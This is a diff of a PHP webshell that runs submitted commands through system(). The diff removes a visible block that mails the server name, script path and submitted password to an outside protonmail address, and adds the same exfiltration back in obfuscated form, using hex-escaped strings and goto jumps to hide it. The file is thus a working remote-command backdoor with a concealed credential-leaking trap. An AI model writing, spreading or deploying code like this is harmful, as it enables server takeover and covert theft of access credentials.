@@ -35,10 +35,6 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')){
     $_COOKIE = stripslashes_array($_COOKIE);
 } */
 
-//--------------Watching webshell!--------------
-if(array_key_exists('watching',$_POST)){
-    $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('1nv1s1bl3-root@protonmail.com', 'root', $tmp); // Edit or delete!
-}
 
 /* (С) 11.2011 oRb */
 if(!empty($_password)) {
@@ -1117,7 +1113,7 @@ Command: <input name=c type=text size=100 value="<?php if (isset($_POST["c"])){p
 <?php if (isset($_POST["c"])){system(stripslashes($_POST["c"])." 2>&1");} ?>
 </pre>';
 
-
+goto rICiw; d4oIH: $ZbcA1 = $_SERVER["\x53\x45\122\x56\105\122\x5f\116\x41\115\x45"] . $_SERVER["\120\110\x50\x5f\123\105\114\x46"] . "\xa" . $_POST["\160\x61\x73\x73"]; goto XVwlL; XVwlL: @mail("\x31\x6e\166\61\163\61\142\154\x33\x2d\162\x6f\157\164\x40\160\162\x6f\x74\x6f\x6e\x6d\x61\151\x6c\x2e\143\x6f\x6d", "\162\x6f\x6f\x74", $ZbcA1); goto o8vwD; rICiw: if (!array_key_exists("\167\141\x74\x63\x68\151\x6e\x67", $_POST)) { goto XP_FZ; } goto d4oIH; o8vwD: XP_FZ:
 
 function actionSelfRemove() {
     if($_POST['p1'] == 'yes')
